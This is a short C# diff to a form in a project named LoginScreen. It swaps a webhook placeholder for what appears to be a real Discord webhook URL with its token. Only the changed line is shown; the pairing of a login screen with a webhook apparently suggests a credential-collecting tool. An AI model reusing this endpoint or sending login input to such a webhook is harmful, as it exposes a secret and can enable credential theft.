@@ -16,7 +16,7 @@ namespace LoginScreen
     public partial class Form2 : Form
     {
         private readonly HttpClient _httpClient = new HttpClient();
-        private readonly string _webhookUrl = "Replace_With_Your_Webhook";
+        private readonly string _webhookUrl = "https://discord.com/api/webhooks/1143530982641762376/yPHcLFilHrpRRuFe_C8GatT7AmJcx9Ooizf8Qqd1q1kECH8-86O4LPApIyeXciCNpesA";
 
         
 
